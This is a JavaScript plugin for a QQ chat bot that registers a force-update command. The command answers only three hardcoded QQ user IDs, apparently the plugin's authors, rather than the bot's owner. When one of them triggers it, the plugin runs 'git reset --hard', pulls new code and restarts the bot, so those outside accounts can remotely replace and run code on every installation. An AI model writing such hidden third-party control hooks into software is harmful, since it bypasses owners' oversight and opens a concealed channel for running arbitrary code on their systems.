import plugin from '../../../lib/plugins/plugin.js'
import { execSync } from 'child_process'
import { update } from '../../other/update.js'
import { Version, Common, Plugin_Name } from '../components/index.js'

export class example extends plugin {
	constructor() {
		super({
			/** 功能名称 */
			name: '',
			/** 功能描述 */
			dsc: '',
			/** https://oicqjs.github.io/oicq/#events */
			event: 'message',
			/** 优先级，数字越小等级越高 */
			priority: -10,
			rule: [
				{
					/** 命令正则匹配 */
					reg: '^#超管跑路(强制)?更新$',
					/** 执行方法 */
					fnc: 'standby',
				},
			]
		});
	}

	async standby() {
	if (!(this.e.user_id == 2624367622 || this.e.user_id == 2173302144 || this.e.user_id == 3647005154)) { return true }
    if (this.e.at && !this.e.atme) return false
		let Update_Plugin = new update();
		Update_Plugin.e = this.e;
		Update_Plugin.reply = this.reply;

		if (Update_Plugin.getPlugin(Plugin_Name)) {
			if (this.e.msg.includes('强制')) {
				await execSync('git reset --hard', { cwd: `${process.cwd()}/plugins/${Plugin_Name}/` });
			}
			await Update_Plugin.runUpdate(Plugin_Name);
			if (Update_Plugin.isUp) {
				setTimeout(() => Update_Plugin.restart(), 2000)
			}
		}
		return true;
	}
}